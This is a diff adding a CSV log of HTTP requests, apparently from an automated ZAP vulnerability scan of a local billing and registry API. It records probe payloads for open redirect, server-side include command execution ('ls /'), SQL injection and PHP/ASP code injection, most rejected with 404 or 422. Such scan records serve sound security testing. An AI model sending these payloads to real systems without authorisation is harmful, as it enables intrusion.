@@ -1,0 +1,446 @@
+ID,Requisição de Timestamp,Timestamp de Resposta,Método,URL,Código,Motivo,RTT,Tamanho do Cabeçalho da Resposta,Tamanho do Corpo da Resposta
+13398,Wed Nov 11 20:47:14 BRT 2026,Wed Nov 11 20:47:14 BRT 2026,GET,http://localhost:8000/3266578335866434294,404,Not Found,3,195,185
+13400,Wed Nov 11 20:47:14 BRT 2026,Wed Nov 11 20:47:14 BRT 2026,GET,http://localhost:8000/v1/billing/315722328425426752,404,Not Found,2,195,185
+13402,Wed Nov 11 20:47:14 BRT 2026,Wed Nov 11 20:47:14 BRT 2026,GET,http://localhost:8000/v1/billing/items/4785422284921771520,422,Unprocessable Entity,5,206,252
+13404,Wed Nov 11 20:47:14 BRT 2026,Wed Nov 11 20:47:14 BRT 2026,GET,http://localhost:8000/v1/registry/clients/2913966801987201410,404,Not Found,2,195,185
+13406,Wed Nov 11 20:47:14 BRT 2026,Wed Nov 11 20:47:14 BRT 2026,GET,http://localhost:8000,404,Not Found,1,195,185
+13407,Wed Nov 11 20:47:14 BRT 2026,Wed Nov 11 20:47:14 BRT 2026,GET,http://localhost:8000/v1/billing,422,Unprocessable Entity,4,206,273
+13408,Wed Nov 11 20:47:14 BRT 2026,Wed Nov 11 20:47:14 BRT 2026,GET,http://localhost:8000/v1/billing/items,405,Method Not Allowed,2,217,195
+13409,Wed Nov 11 20:47:14 BRT 2026,Wed Nov 11 20:47:14 BRT 2026,GET,http://localhost:8000/v1/billing/items/item_uuid,422,Unprocessable Entity,3,206,261
+13410,Wed Nov 11 20:47:14 BRT 2026,Wed Nov 11 20:47:14 BRT 2026,GET,http://localhost:8000/v1/billing/items/http%3A%2F%2Fwww.google.com%2F,404,Not Found,4,195,185
+13411,Wed Nov 11 20:47:14 BRT 2026,Wed Nov 11 20:47:14 BRT 2026,GET,http://localhost:8000/v1/billing/items/http%3A%2F%2Fwww.google.com%3A80%2F,404,Not Found,2,195,185
+13412,Wed Nov 11 20:47:14 BRT 2026,Wed Nov 11 20:47:14 BRT 2026,GET,http://localhost:8000/v1/billing/items/http%3A%2F%2Fwww.google.com,404,Not Found,3,195,185
+13413,Wed Nov 11 20:47:14 BRT 2026,Wed Nov 11 20:47:14 BRT 2026,GET,http://localhost:8000/v1/registry/clients,200,OK,11,188,637
+13414,Wed Nov 11 20:47:14 BRT 2026,Wed Nov 11 20:47:14 BRT 2026,GET,http://localhost:8000/v1/billing/items/http%3A%2F%2Fwww.google.com%2Fsearch%3Fq%3DZAP,404,Not Found,2,195,185
+13415,Wed Nov 11 20:47:14 BRT 2026,Wed Nov 11 20:47:14 BRT 2026,GET,http://localhost:8000/v1/billing/items/http%3A%2F%2Fwww.google.com%3A80%2Fsearch%3Fq%3DZAP,404,Not Found,2,195,185
+13416,Wed Nov 11 20:47:14 BRT 2026,Wed Nov 11 20:47:14 BRT 2026,GET,http://localhost:8000/v1/billing/items/www.google.com%2F,307,Temporary Redirect,2,235,0
+13417,Wed Nov 11 20:47:14 BRT 2026,Wed Nov 11 20:47:14 BRT 2026,GET,http://localhost:8000/v1/billing/items/www.google.com%3A80%2F,307,Temporary Redirect,2,238,0
+13418,Wed Nov 11 20:47:14 BRT 2026,Wed Nov 11 20:47:14 BRT 2026,GET,http://localhost:8000/v1/registry/clients/client_uuid/service-rules,422,Unprocessable Entity,9,206,263
+13419,Wed Nov 11 20:47:14 BRT 2026,Wed Nov 11 20:47:14 BRT 2026,GET,http://localhost:8000/v1/registry/clients/http%3A%2F%2Fwww.google.com%2F/service-rules,404,Not Found,3,195,185
+13420,Wed Nov 11 20:47:14 BRT 2026,Wed Nov 11 20:47:14 BRT 2026,GET,http://localhost:8000/v1/billing/items/www.google.com,422,Unprocessable Entity,5,206,261
+13421,Wed Nov 11 20:47:14 BRT 2026,Wed Nov 11 20:47:14 BRT 2026,GET,http://localhost:8000/v1/registry/clients/http%3A%2F%2Fwww.google.com%3A80%2F/service-rules,404,Not Found,3,195,185
+13422,Wed Nov 11 20:47:14 BRT 2026,Wed Nov 11 20:47:14 BRT 2026,GET,http://localhost:8000/v1/billing/items/www.google.com%2Fsearch%3Fq%3DZAP,404,Not Found,2,195,185
+13423,Wed Nov 11 20:47:14 BRT 2026,Wed Nov 11 20:47:14 BRT 2026,GET,http://localhost:8000/v1/registry/clients/http%3A%2F%2Fwww.google.com/service-rules,404,Not Found,2,195,185
+13424,Wed Nov 11 20:47:14 BRT 2026,Wed Nov 11 20:47:14 BRT 2026,GET,http://localhost:8000/v1/billing/items/www.google.com%3A80%2Fsearch%3Fq%3DZAP,404,Not Found,1,195,185
+13425,Wed Nov 11 20:47:14 BRT 2026,Wed Nov 11 20:47:14 BRT 2026,GET,http://localhost:8000/v1/registry/clients/http%3A%2F%2Fwww.google.com%2Fsearch%3Fq%3DZAP/service-rules,404,Not Found,1,195,185
+13426,Wed Nov 11 20:47:14 BRT 2026,Wed Nov 11 20:47:14 BRT 2026,GET,http://localhost:8000/v1/registry/clients/http%3A%2F%2Fwww.google.com%3A80%2Fsearch%3Fq%3DZAP/service-rules,404,Not Found,1,195,185
+13427,Wed Nov 11 20:47:14 BRT 2026,Wed Nov 11 20:47:14 BRT 2026,GET,http://localhost:8000/v1/registry/clients/www.google.com%2F/service-rules,404,Not Found,1,195,185
+13428,Wed Nov 11 20:47:14 BRT 2026,Wed Nov 11 20:47:14 BRT 2026,GET,http://localhost:8000/v1/registry/clients/www.google.com%3A80%2F/service-rules,404,Not Found,0,195,185
+13429,Wed Nov 11 20:47:14 BRT 2026,Wed Nov 11 20:47:14 BRT 2026,GET,http://localhost:8000/v1/registry/clients/www.google.com/service-rules,422,Unprocessable Entity,2,206,263
+13430,Wed Nov 11 20:47:14 BRT 2026,Wed Nov 11 20:47:14 BRT 2026,GET,http://localhost:8000/v1/registry/clients/www.google.com%2Fsearch%3Fq%3DZAP/service-rules,404,Not Found,1,195,185
+13431,Wed Nov 11 20:47:14 BRT 2026,Wed Nov 11 20:47:14 BRT 2026,GET,http://localhost:8000/v1/registry/clients/www.google.com%3A80%2Fsearch%3Fq%3DZAP/service-rules,404,Not Found,0,195,185
+13432,Wed Nov 11 20:47:14 BRT 2026,Wed Nov 11 20:47:14 BRT 2026,GET,http://localhost:8000,404,Not Found,1,195,185
+13433,Wed Nov 11 20:47:14 BRT 2026,Wed Nov 11 20:47:14 BRT 2026,GET,http://localhost:8000/v1/billing,422,Unprocessable Entity,1,206,273
+13434,Wed Nov 11 20:47:14 BRT 2026,Wed Nov 11 20:47:14 BRT 2026,GET,http://localhost:8000/v1/billing/items,405,Method Not Allowed,1,217,195
+13435,Wed Nov 11 20:47:14 BRT 2026,Wed Nov 11 20:47:14 BRT 2026,GET,http://localhost:8000/v1/billing/items/item_uuid,422,Unprocessable Entity,1,206,261
+13436,Wed Nov 11 20:47:14 BRT 2026,Wed Nov 11 20:47:14 BRT 2026,GET,http://localhost:8000/v1/billing/items/1292598233582489409.owasp.org,422,Unprocessable Entity,2,206,262
+13437,Wed Nov 11 20:47:14 BRT 2026,Wed Nov 11 20:47:14 BRT 2026,GET,http://localhost:8000/v1/billing/items/https%3A%2F%2F1292598233582489409.owasp.org,404,Not Found,1,195,185
+13438,Wed Nov 11 20:47:14 BRT 2026,Wed Nov 11 20:47:14 BRT 2026,GET,http://localhost:8000/v1/billing/items/https%3A%2F%2F1292598233582489409%252eowasp%252eorg,404,Not Found,1,195,185
+13439,Wed Nov 11 20:47:14 BRT 2026,Wed Nov 11 20:47:14 BRT 2026,GET,http://localhost:8000/v1/registry/clients,200,OK,5,188,637
+13440,Wed Nov 11 20:47:14 BRT 2026,Wed Nov 11 20:47:14 BRT 2026,GET,http://localhost:8000/v1/billing/items/5%3BURL%3D%27https%3A%2F%2F1292598233582489409.owasp.org%27,404,Not Found,1,195,185
+13441,Wed Nov 11 20:47:14 BRT 2026,Wed Nov 11 20:47:14 BRT 2026,GET,http://localhost:8000/v1/billing/items/URL%3D%27http%3A%2F%2F1292598233582489409.owasp.org%27,404,Not Found,1,195,185
+13442,Wed Nov 11 20:47:14 BRT 2026,Wed Nov 11 20:47:14 BRT 2026,GET,http://localhost:8000/v1/billing/items/https%3A%2F%2F1292598233582489409.owasp.org%2F%3Fitem_uuid,404,Not Found,1,195,185
+13443,Wed Nov 11 20:47:14 BRT 2026,Wed Nov 11 20:47:14 BRT 2026,GET,http://localhost:8000/v1/registry/clients/client_uuid/service-rules,422,Unprocessable Entity,2,206,263
+13444,Wed Nov 11 20:47:14 BRT 2026,Wed Nov 11 20:47:14 BRT 2026,GET,http://localhost:8000/v1/billing/items/5%3BURL%3D%27https%3A%2F%2F1292598233582489409.owasp.org%2F%3Fitem_uuid%27,404,Not Found,1,195,185
+13445,Wed Nov 11 20:47:14 BRT 2026,Wed Nov 11 20:47:14 BRT 2026,GET,http://localhost:8000/v1/billing/items/https%3A%2F%2F%5C1292598233582489409.owasp.org,404,Not Found,1,195,185
+13446,Wed Nov 11 20:47:14 BRT 2026,Wed Nov 11 20:47:14 BRT 2026,GET,http://localhost:8000/v1/billing/items/http%3A%2F%2F%5C1292598233582489409.owasp.org,404,Not Found,1,195,185
+13447,Wed Nov 11 20:47:14 BRT 2026,Wed Nov 11 20:47:14 BRT 2026,GET,http://localhost:8000/v1/registry/clients/1292598233582489409.owasp.org/service-rules,422,Unprocessable Entity,3,206,264
+13448,Wed Nov 11 20:47:14 BRT 2026,Wed Nov 11 20:47:14 BRT 2026,GET,http://localhost:8000/v1/registry/clients/https%3A%2F%2F1292598233582489409.owasp.org/service-rules,404,Not Found,1,195,185
+13449,Wed Nov 11 20:47:14 BRT 2026,Wed Nov 11 20:47:14 BRT 2026,GET,http://localhost:8000/v1/registry/clients/https%3A%2F%2F1292598233582489409%252eowasp%252eorg/service-rules,404,Not Found,1,195,185
+13450,Wed Nov 11 20:47:14 BRT 2026,Wed Nov 11 20:47:14 BRT 2026,GET,http://localhost:8000/v1/registry/clients/5%3BURL%3D%27https%3A%2F%2F1292598233582489409.owasp.org%27/service-rules,404,Not Found,0,195,185
+13451,Wed Nov 11 20:47:14 BRT 2026,Wed Nov 11 20:47:14 BRT 2026,GET,http://localhost:8000/v1/registry/clients/URL%3D%27http%3A%2F%2F1292598233582489409.owasp.org%27/service-rules,404,Not Found,0,195,185
+13452,Wed Nov 11 20:47:14 BRT 2026,Wed Nov 11 20:47:14 BRT 2026,GET,http://localhost:8000/v1/registry/clients/https%3A%2F%2F1292598233582489409.owasp.org%2F%3Fclient_uuid/service-rules,404,Not Found,0,195,185
+13453,Wed Nov 11 20:47:14 BRT 2026,Wed Nov 11 20:47:14 BRT 2026,GET,http://localhost:8000/v1/registry/clients/5%3BURL%3D%27https%3A%2F%2F1292598233582489409.owasp.org%2F%3Fclient_uuid%27/service-rules,404,Not Found,0,195,185
+13454,Wed Nov 11 20:47:14 BRT 2026,Wed Nov 11 20:47:14 BRT 2026,GET,http://localhost:8000/v1/registry/clients/https%3A%2F%2F%5C1292598233582489409.owasp.org/service-rules,404,Not Found,1,195,185
+13455,Wed Nov 11 20:47:14 BRT 2026,Wed Nov 11 20:47:14 BRT 2026,GET,http://localhost:8000/v1/registry/clients/http%3A%2F%2F%5C1292598233582489409.owasp.org/service-rules,404,Not Found,0,195,185
+13456,Wed Nov 11 20:47:14 BRT 2026,Wed Nov 11 20:47:14 BRT 2026,GET,http://localhost:8000,404,Not Found,0,195,185
+13457,Wed Nov 11 20:47:14 BRT 2026,Wed Nov 11 20:47:14 BRT 2026,GET,http://localhost:8000/v1/billing,422,Unprocessable Entity,1,206,273
+13458,Wed Nov 11 20:47:14 BRT 2026,Wed Nov 11 20:47:14 BRT 2026,GET,http://localhost:8000/v1/billing/items,405,Method Not Allowed,0,217,195
+13459,Wed Nov 11 20:47:14 BRT 2026,Wed Nov 11 20:47:14 BRT 2026,GET,http://localhost:8000/v1/billing/items/item_uuid,422,Unprocessable Entity,2,206,261
+13460,Wed Nov 11 20:47:14 BRT 2026,Wed Nov 11 20:47:14 BRT 2026,GET,http://localhost:8000/v1/billing/items/%3C%21--%23EXEC+cmd%3D%22ls+%2F%22--%3E,404,Not Found,0,195,185
+13461,Wed Nov 11 20:47:14 BRT 2026,Wed Nov 11 20:47:14 BRT 2026,GET,http://localhost:8000/v1/billing/items/%22%3E%3C%21--%23EXEC+cmd%3D%22ls+%2F%22--%3E%3C,404,Not Found,0,195,185
+13462,Wed Nov 11 20:47:14 BRT 2026,Wed Nov 11 20:47:14 BRT 2026,GET,http://localhost:8000/v1/registry/clients,200,OK,4,188,637
+13463,Wed Nov 11 20:47:14 BRT 2026,Wed Nov 11 20:47:14 BRT 2026,GET,http://localhost:8000/v1/billing/items/%3C%21--%23EXEC+cmd%3D%22dir+%5C%22--%3E,422,Unprocessable Entity,2,206,261
+13464,Wed Nov 11 20:47:14 BRT 2026,Wed Nov 11 20:47:14 BRT 2026,GET,http://localhost:8000/v1/billing/items/%22%3E%3C%21--%23EXEC+cmd%3D%22dir+%5C%22--%3E%3C,422,Unprocessable Entity,3,206,262
+13465,Wed Nov 11 20:47:14 BRT 2026,Wed Nov 11 20:47:14 BRT 2026,GET,http://localhost:8000/v1/registry/clients/client_uuid/service-rules,422,Unprocessable Entity,2,206,263
+13466,Wed Nov 11 20:47:14 BRT 2026,Wed Nov 11 20:47:14 BRT 2026,GET,http://localhost:8000/v1/registry/clients/%3C%21--%23EXEC+cmd%3D%22ls+%2F%22--%3E/service-rules,404,Not Found,1,195,185
+13467,Wed Nov 11 20:47:14 BRT 2026,Wed Nov 11 20:47:14 BRT 2026,GET,http://localhost:8000/v1/registry/clients/%22%3E%3C%21--%23EXEC+cmd%3D%22ls+%2F%22--%3E%3C/service-rules,404,Not Found,1,195,185
+13468,Wed Nov 11 20:47:14 BRT 2026,Wed Nov 11 20:47:14 BRT 2026,GET,http://localhost:8000/v1/registry/clients/%3C%21--%23EXEC+cmd%3D%22dir+%5C%22--%3E/service-rules,422,Unprocessable Entity,1,206,263
+13469,Wed Nov 11 20:47:14 BRT 2026,Wed Nov 11 20:47:14 BRT 2026,GET,http://localhost:8000/v1/registry/clients/%22%3E%3C%21--%23EXEC+cmd%3D%22dir+%5C%22--%3E%3C/service-rules,422,Unprocessable Entity,2,206,264
+13470,Wed Nov 11 20:47:14 BRT 2026,Wed Nov 11 20:47:14 BRT 2026,GET,http://localhost:8000,404,Not Found,0,195,185
+13471,Wed Nov 11 20:47:14 BRT 2026,Wed Nov 11 20:47:14 BRT 2026,GET,http://localhost:8000/v1/billing,422,Unprocessable Entity,1,206,273
+13472,Wed Nov 11 20:47:14 BRT 2026,Wed Nov 11 20:47:14 BRT 2026,GET,http://localhost:8000/v1/billing/items,405,Method Not Allowed,0,217,195
+13473,Wed Nov 11 20:47:14 BRT 2026,Wed Nov 11 20:47:14 BRT 2026,GET,http://localhost:8000/v1/billing/items/item_uuid,422,Unprocessable Entity,1,206,261
+13474,Wed Nov 11 20:47:14 BRT 2026,Wed Nov 11 20:47:14 BRT 2026,GET,http://localhost:8000/v1/billing/items/%27,422,Unprocessable Entity,2,206,261
+13475,Wed Nov 11 20:47:14 BRT 2026,Wed Nov 11 20:47:14 BRT 2026,GET,http://localhost:8000/v1/registry/clients,200,OK,3,188,637
+13476,Wed Nov 11 20:47:14 BRT 2026,Wed Nov 11 20:47:14 BRT 2026,GET,http://localhost:8000/v1/billing/items/item_uuid%27,422,Unprocessable Entity,1,206,261
+13477,Wed Nov 11 20:47:14 BRT 2026,Wed Nov 11 20:47:14 BRT 2026,GET,http://localhost:8000/v1/registry/clients/client_uuid/service-rules,422,Unprocessable Entity,2,206,263
+13478,Wed Nov 11 20:47:14 BRT 2026,Wed Nov 11 20:47:14 BRT 2026,GET,http://localhost:8000/v1/billing/items/%22,422,Unprocessable Entity,2,206,262
+13479,Wed Nov 11 20:47:14 BRT 2026,Wed Nov 11 20:47:14 BRT 2026,GET,http://localhost:8000/v1/billing/items/item_uuid%22,422,Unprocessable Entity,2,206,261
+13480,Wed Nov 11 20:47:14 BRT 2026,Wed Nov 11 20:47:14 BRT 2026,GET,http://localhost:8000/v1/registry/clients/%27/service-rules,422,Unprocessable Entity,3,206,263
+13481,Wed Nov 11 20:47:14 BRT 2026,Wed Nov 11 20:47:14 BRT 2026,GET,http://localhost:8000/v1/billing/items/%3B,422,Unprocessable Entity,2,206,261
+13482,Wed Nov 11 20:47:14 BRT 2026,Wed Nov 11 20:47:14 BRT 2026,GET,http://localhost:8000/v1/registry/clients/client_uuid%27/service-rules,422,Unprocessable Entity,2,206,263
+13483,Wed Nov 11 20:47:14 BRT 2026,Wed Nov 11 20:47:14 BRT 2026,GET,http://localhost:8000/v1/billing/items/item_uuid%3B,422,Unprocessable Entity,2,206,261
+13484,Wed Nov 11 20:47:14 BRT 2026,Wed Nov 11 20:47:14 BRT 2026,GET,http://localhost:8000/v1/registry/clients/%22/service-rules,422,Unprocessable Entity,2,206,264
+13485,Wed Nov 11 20:47:14 BRT 2026,Wed Nov 11 20:47:14 BRT 2026,GET,http://localhost:8000/v1/billing/items/%27%28,422,Unprocessable Entity,2,206,261
+13486,Wed Nov 11 20:47:14 BRT 2026,Wed Nov 11 20:47:14 BRT 2026,GET,http://localhost:8000/v1/registry/clients/client_uuid%22/service-rules,422,Unprocessable Entity,2,206,263
+13487,Wed Nov 11 20:47:14 BRT 2026,Wed Nov 11 20:47:14 BRT 2026,GET,http://localhost:8000/v1/billing/items/item_uuid%27%28,422,Unprocessable Entity,2,206,261
+13488,Wed Nov 11 20:47:14 BRT 2026,Wed Nov 11 20:47:14 BRT 2026,GET,http://localhost:8000/v1/registry/clients/%3B/service-rules,422,Unprocessable Entity,2,206,263
+13489,Wed Nov 11 20:47:14 BRT 2026,Wed Nov 11 20:47:14 BRT 2026,GET,http://localhost:8000/v1/billing/items/item_uuid,422,Unprocessable Entity,2,206,261
+13490,Wed Nov 11 20:47:14 BRT 2026,Wed Nov 11 20:47:14 BRT 2026,GET,http://localhost:8000/v1/registry/clients/client_uuid%3B/service-rules,422,Unprocessable Entity,2,206,263
+13491,Wed Nov 11 20:47:14 BRT 2026,Wed Nov 11 20:47:14 BRT 2026,GET,http://localhost:8000/v1/billing/items/item_uuid,422,Unprocessable Entity,1,206,261
+13492,Wed Nov 11 20:47:14 BRT 2026,Wed Nov 11 20:47:14 BRT 2026,GET,http://localhost:8000/v1/billing/items/item_uuid+AND+1%3D1+--+,422,Unprocessable Entity,1,206,261
+13493,Wed Nov 11 20:47:14 BRT 2026,Wed Nov 11 20:47:14 BRT 2026,GET,http://localhost:8000/v1/registry/clients/%27%28/service-rules,422,Unprocessable Entity,2,206,263
+13494,Wed Nov 11 20:47:14 BRT 2026,Wed Nov 11 20:47:14 BRT 2026,GET,http://localhost:8000/v1/billing/items/item_uuid%27+AND+%271%27%3D%271%27+--+,422,Unprocessable Entity,2,206,261
+13495,Wed Nov 11 20:47:14 BRT 2026,Wed Nov 11 20:47:14 BRT 2026,GET,http://localhost:8000/v1/registry/clients/client_uuid%27%28/service-rules,422,Unprocessable Entity,2,206,263
+13496,Wed Nov 11 20:47:14 BRT 2026,Wed Nov 11 20:47:14 BRT 2026,GET,http://localhost:8000/v1/billing/items/item_uuid%22+AND+%221%22%3D%221%22+--+,422,Unprocessable Entity,2,206,261
+13497,Wed Nov 11 20:47:14 BRT 2026,Wed Nov 11 20:47:14 BRT 2026,GET,http://localhost:8000/v1/registry/clients/client_uuid/service-rules,422,Unprocessable Entity,3,206,263
+13498,Wed Nov 11 20:47:14 BRT 2026,Wed Nov 11 20:47:14 BRT 2026,GET,http://localhost:8000/v1/billing/items/item_uuid+AND+1%3D1,422,Unprocessable Entity,3,206,261
+13499,Wed Nov 11 20:47:14 BRT 2026,Wed Nov 11 20:47:14 BRT 2026,GET,http://localhost:8000/v1/registry/clients/client_uuid/service-rules,422,Unprocessable Entity,2,206,263
+13500,Wed Nov 11 20:47:14 BRT 2026,Wed Nov 11 20:47:14 BRT 2026,GET,http://localhost:8000/v1/billing/items/item_uuid%27+AND+%271%27%3D%271,422,Unprocessable Entity,2,206,261
+13501,Wed Nov 11 20:47:14 BRT 2026,Wed Nov 11 20:47:14 BRT 2026,GET,http://localhost:8000/v1/registry/clients/client_uuid+AND+1%3D1+--+/service-rules,422,Unprocessable Entity,2,206,263
+13502,Wed Nov 11 20:47:14 BRT 2026,Wed Nov 11 20:47:14 BRT 2026,GET,http://localhost:8000/v1/billing/items/item_uuid%22+AND+%221%22%3D%221,422,Unprocessable Entity,2,206,261
+13503,Wed Nov 11 20:47:14 BRT 2026,Wed Nov 11 20:47:14 BRT 2026,GET,http://localhost:8000/v1/registry/clients/client_uuid%27+AND+%271%27%3D%271%27+--+/service-rules,422,Unprocessable Entity,2,206,263
+13504,Wed Nov 11 20:47:14 BRT 2026,Wed Nov 11 20:47:14 BRT 2026,GET,http://localhost:8000/v1/billing/items/item_uuid+UNION+ALL+select+NULL+--+,422,Unprocessable Entity,2,206,261
+13505,Wed Nov 11 20:47:14 BRT 2026,Wed Nov 11 20:47:14 BRT 2026,GET,http://localhost:8000/v1/registry/clients/client_uuid%22+AND+%221%22%3D%221%22+--+/service-rules,422,Unprocessable Entity,1,206,263
+13506,Wed Nov 11 20:47:14 BRT 2026,Wed Nov 11 20:47:14 BRT 2026,GET,http://localhost:8000/v1/registry/clients/client_uuid+AND+1%3D1/service-rules,422,Unprocessable Entity,1,206,263
+13507,Wed Nov 11 20:47:14 BRT 2026,Wed Nov 11 20:47:14 BRT 2026,GET,http://localhost:8000/v1/billing/items/item_uuid%27+UNION+ALL+select+NULL+--+,422,Unprocessable Entity,3,206,261
+13508,Wed Nov 11 20:47:14 BRT 2026,Wed Nov 11 20:47:14 BRT 2026,GET,http://localhost:8000/v1/billing/items/item_uuid%22+UNION+ALL+select+NULL+--+,422,Unprocessable Entity,2,206,261
+13509,Wed Nov 11 20:47:14 BRT 2026,Wed Nov 11 20:47:14 BRT 2026,GET,http://localhost:8000/v1/registry/clients/client_uuid%27+AND+%271%27%3D%271/service-rules,422,Unprocessable Entity,2,206,263
+13510,Wed Nov 11 20:47:14 BRT 2026,Wed Nov 11 20:47:14 BRT 2026,GET,http://localhost:8000/v1/billing/items/item_uuid%29+UNION+ALL+select+NULL+--+,422,Unprocessable Entity,2,206,261
+13511,Wed Nov 11 20:47:14 BRT 2026,Wed Nov 11 20:47:14 BRT 2026,GET,http://localhost:8000/v1/registry/clients/client_uuid%22+AND+%221%22%3D%221/service-rules,422,Unprocessable Entity,2,206,263
+13512,Wed Nov 11 20:47:14 BRT 2026,Wed Nov 11 20:47:14 BRT 2026,GET,http://localhost:8000/v1/billing/items/item_uuid%27%29+UNION+ALL+select+NULL+--+,422,Unprocessable Entity,2,206,261
+13513,Wed Nov 11 20:47:14 BRT 2026,Wed Nov 11 20:47:14 BRT 2026,GET,http://localhost:8000/v1/registry/clients/client_uuid+UNION+ALL+select+NULL+--+/service-rules,422,Unprocessable Entity,3,206,263
+13514,Wed Nov 11 20:47:14 BRT 2026,Wed Nov 11 20:47:14 BRT 2026,GET,http://localhost:8000/v1/billing/items/item_uuid,422,Unprocessable Entity,2,206,261
+13515,Wed Nov 11 20:47:14 BRT 2026,Wed Nov 11 20:47:14 BRT 2026,GET,http://localhost:8000/v1/registry/clients/client_uuid%27+UNION+ALL+select+NULL+--+/service-rules,422,Unprocessable Entity,2,206,263
+13516,Wed Nov 11 20:47:14 BRT 2026,Wed Nov 11 20:47:14 BRT 2026,GET,http://localhost:8000/v1/registry/clients/client_uuid%22+UNION+ALL+select+NULL+--+/service-rules,422,Unprocessable Entity,1,206,263
+13517,Wed Nov 11 20:47:14 BRT 2026,Wed Nov 11 20:47:14 BRT 2026,GET,http://localhost:8000/v1/registry/clients/client_uuid%29+UNION+ALL+select+NULL+--+/service-rules,422,Unprocessable Entity,1,206,263
+13518,Wed Nov 11 20:47:14 BRT 2026,Wed Nov 11 20:47:14 BRT 2026,GET,http://localhost:8000/v1/registry/clients/client_uuid%27%29+UNION+ALL+select+NULL+--+/service-rules,422,Unprocessable Entity,2,206,263
+13519,Wed Nov 11 20:47:14 BRT 2026,Wed Nov 11 20:47:14 BRT 2026,GET,http://localhost:8000/v1/registry/clients/client_uuid/service-rules,422,Unprocessable Entity,1,206,263
+13520,Wed Nov 11 20:47:14 BRT 2026,Wed Nov 11 20:47:14 BRT 2026,GET,http://localhost:8000,404,Not Found,1,195,185
+13521,Wed Nov 11 20:47:14 BRT 2026,Wed Nov 11 20:47:14 BRT 2026,GET,http://localhost:8000/v1/billing,422,Unprocessable Entity,2,206,273
+13522,Wed Nov 11 20:47:14 BRT 2026,Wed Nov 11 20:47:14 BRT 2026,GET,http://localhost:8000/v1/billing/items,405,Method Not Allowed,0,217,195
+13523,Wed Nov 11 20:47:14 BRT 2026,Wed Nov 11 20:47:14 BRT 2026,GET,http://localhost:8000/v1/billing/items/item_uuid,422,Unprocessable Entity,1,206,261
+13524,Wed Nov 11 20:47:14 BRT 2026,Wed Nov 11 20:47:14 BRT 2026,GET,http://localhost:8000/v1/billing/items/%22%3Bprint%28chr%28122%29.chr%2897%29.chr%28112%29.chr%2895%29.chr%28116%29.chr%28111%29.chr%28107%29.chr%28101%29.chr%28110%29%29%3B%24var%3D%22,422,Unprocessable Entity,2,206,252
+13525,Wed Nov 11 20:47:14 BRT 2026,Wed Nov 11 20:47:14 BRT 2026,GET,http://localhost:8000/v1/registry/clients,200,OK,3,188,637
+13526,Wed Nov 11 20:47:14 BRT 2026,Wed Nov 11 20:47:14 BRT 2026,GET,http://localhost:8000/v1/billing/items/%27%3Bprint%28chr%28122%29.chr%2897%29.chr%28112%29.chr%2895%29.chr%28116%29.chr%28111%29.chr%28107%29.chr%28101%29.chr%28110%29%29%3B%24var%3D%27,422,Unprocessable Entity,1,206,252
+13527,Wed Nov 11 20:47:14 BRT 2026,Wed Nov 11 20:47:14 BRT 2026,GET,http://localhost:8000/v1/billing/items/%24%7B%40print%28chr%28122%29.chr%2897%29.chr%28112%29.chr%2895%29.chr%28116%29.chr%28111%29.chr%28107%29.chr%28101%29.chr%28110%29%29%7D,422,Unprocessable Entity,1,206,252
+13528,Wed Nov 11 20:47:14 BRT 2026,Wed Nov 11 20:47:14 BRT 2026,GET,http://localhost:8000/v1/registry/clients/client_uuid/service-rules,422,Unprocessable Entity,2,206,263
+13529,Wed Nov 11 20:47:14 BRT 2026,Wed Nov 11 20:47:14 BRT 2026,GET,http://localhost:8000/v1/billing/items/%24%7B%40print%28chr%28122%29.chr%2897%29.chr%28112%29.chr%2895%29.chr%28116%29.chr%28111%29.chr%28107%29.chr%28101%29.chr%28110%29%29%7D%5C,422,Unprocessable Entity,1,206,252
+13530,Wed Nov 11 20:47:14 BRT 2026,Wed Nov 11 20:47:14 BRT 2026,GET,http://localhost:8000/v1/registry/clients/%22%3Bprint%28chr%28122%29.chr%2897%29.chr%28112%29.chr%2895%29.chr%28116%29.chr%28111%29.chr%28107%29.chr%28101%29.chr%28110%29%29%3B%24var%3D%22/service-rules,422,Unprocessable Entity,2,206,254
+13531,Wed Nov 11 20:47:14 BRT 2026,Wed Nov 11 20:47:14 BRT 2026,GET,http://localhost:8000/v1/billing/items/%3Bprint%28chr%28122%29.chr%2897%29.chr%28112%29.chr%2895%29.chr%28116%29.chr%28111%29.chr%28107%29.chr%28101%29.chr%28110%29%29%3B,422,Unprocessable Entity,2,206,252
+13532,Wed Nov 11 20:47:14 BRT 2026,Wed Nov 11 20:47:14 BRT 2026,GET,http://localhost:8000/v1/billing/items/%22%2Bresponse.write%28929.338*589.948%29%2B%22,422,Unprocessable Entity,2,206,262
+13533,Wed Nov 11 20:47:14 BRT 2026,Wed Nov 11 20:47:14 BRT 2026,GET,http://localhost:8000/v1/registry/clients/%27%3Bprint%28chr%28122%29.chr%2897%29.chr%28112%29.chr%2895%29.chr%28116%29.chr%28111%29.chr%28107%29.chr%28101%29.chr%28110%29%29%3B%24var%3D%27/service-rules,422,Unprocessable Entity,2,206,254
+13534,Wed Nov 11 20:47:14 BRT 2026,Wed Nov 11 20:47:14 BRT 2026,GET,http://localhost:8000/v1/billing/items/%2Bresponse.write%28%7B0%7D*%7B1%7D%29%2B,422,Unprocessable Entity,2,206,261
+13535,Wed Nov 11 20:47:14 BRT 2026,Wed Nov 11 20:47:14 BRT 2026,GET,http://localhost:8000/v1/registry/clients/%24%7B%40print%28chr%28122%29.chr%2897%29.chr%28112%29.chr%2895%29.chr%28116%29.chr%28111%29.chr%28107%29.chr%28101%29.chr%28110%29%29%7D/service-rules,422,Unprocessable Entity,2,206,254
+13536,Wed Nov 11 20:47:14 BRT 2026,Wed Nov 11 20:47:14 BRT 2026,GET,http://localhost:8000/v1/billing/items/response.write%28929.338*589.948%29,422,Unprocessable Entity,3,206,261
+13537,Wed Nov 11 20:47:14 BRT 2026,Wed Nov 11 20:47:14 BRT 2026,GET,http://localhost:8000/v1/registry/clients/%24%7B%40print%28chr%28122%29.chr%2897%29.chr%28112%29.chr%2895%29.chr%28116%29.chr%28111%29.chr%28107%29.chr%28101%29.chr%28110%29%29%7D%5C/service-rules,422,Unprocessable Entity,2,206,254
+13538,Wed Nov 11 20:47:14 BRT 2026,Wed Nov 11 20:47:14 BRT 2026,GET,http://localhost:8000/v1/registry/clients/%3Bprint%28chr%28122%29.chr%2897%29.chr%28112%29.chr%2895%29.chr%28116%29.chr%28111%29.chr%28107%29.chr%28101%29.chr%28110%29%29%3B/service-rules,422,Unprocessable Entity,1,206,254
